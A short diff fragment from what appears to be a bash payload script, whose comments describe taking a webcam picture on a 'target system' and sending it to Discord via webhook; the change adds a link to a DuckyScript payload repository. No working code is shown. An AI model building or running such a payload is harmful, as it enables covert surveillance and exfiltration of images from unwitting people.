@@ -1,5 +1,6 @@
 # Bash script for Web_Watcher payload that checks for internet connectivity, and if present, takes a picture with the onboard webcam, and then sends it to Discord via webhook.
 # fswebcam must be installed on the target system for this script to run correctly (sudo apt install fswebcam).
+# https://github.com/OSINTI4L/DuckyScript-Payloads
 
 #!/bin/bash
 
